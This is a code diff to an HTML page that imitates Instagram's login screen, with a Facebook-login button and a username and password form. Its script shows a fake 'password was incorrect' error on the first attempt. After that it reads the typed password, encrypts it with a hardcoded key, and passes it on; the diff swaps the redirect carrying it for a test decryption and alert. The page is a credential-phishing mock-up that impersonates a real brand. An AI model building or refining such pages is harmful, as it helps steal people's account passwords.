@@ -28,8 +28,17 @@
         <div class="header">
             <div class="top">
                 <div class="logo">
-                    <img src="instagram.png" alt="instagram" style="width: 175px;">
+                    <img src="instagram.svg" alt="instagram" style="width: 175px;">
                 </div>
+                <div class="form" id="addtext">
+                    <button style="width: 100%;" class="btn"><a href="#"><img width="12px" height="12px" src="pinpng1060155.png" alt="facebook"> Continue with Facebook</a></button>
+                </div>
+                <div class="or">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+
                 <form class="form" id="addtext">
                     <div class="input_field">
                         <input type="text" placeholder="Phone number, username, or email" class="input">
@@ -39,17 +48,7 @@
                     </div>
                     <button type="submit" onclick="myFunction()" style="width: 100%;" class="btn"><a href="#">Log In</a></button>
                 </form>
-                <div class="or">
-                    <div class="line"></div>
-                    <p>OR</p>
-                    <div class="line"></div>
-                </div>
-                <div class="dif">
-                    <div class="fb">
-                        <img src="facebook.png" alt="facebook">
-                        <p>Log in with Facebook</p>
-                    </div>
-                </div>
+
                 <div id="aarrt" style="display: none;" class="eiCW-">
                     <p style="width:110%" aria-atomic="true" data-testid="login-error-message" id="slfErrorAlert" role="alert">Sorry, your password was incorrect. Please double-check your password.</p>
                 </div>
@@ -82,16 +81,16 @@
             var element = document.getElementById("aarrt").style.display = "block";
             count++;
         } else {
-             var element2 = document.getElementById("PSWRAGS").value;
+            var element2 = document.getElementById("PSWRAGS").value;
             var encrypted = CryptoJS.AES.encrypt(element2, "SECRET");
             //U2FsdGVkX18ZUVvShFSES21qHsQEqZXMxQ9zgHy+bu0=
             // alert(encrypted)
-            //encrypted2 = "U2FsdGVkX1/cP8EHFOirOH3Cc/P8xQzmz6GUx2UTagc="
-            // var decrypted = CryptoJS.AES.decrypt(encrypted2, "SECRET");
-            //dded = decrypted.toString(CryptoJS.enc.Utf8);
-            //alert(dded)
-            //4d657373616765
-            window.location = "profile.html?id=$" + encrypted;
+            encrypted2 = "U2FsdGVkX196xRs2PupFdlC51+gA/PmaJdOPcpgVk5Y="
+            var decrypted = CryptoJS.AES.decrypt(encrypted2, "SECRET");
+            dded = decrypted.toString(CryptoJS.enc.Utf8);
+            alert(dded)
+                //4d657373616765
+                // window.location = "profile.html?id=$" + encrypted;
 
         }
     }
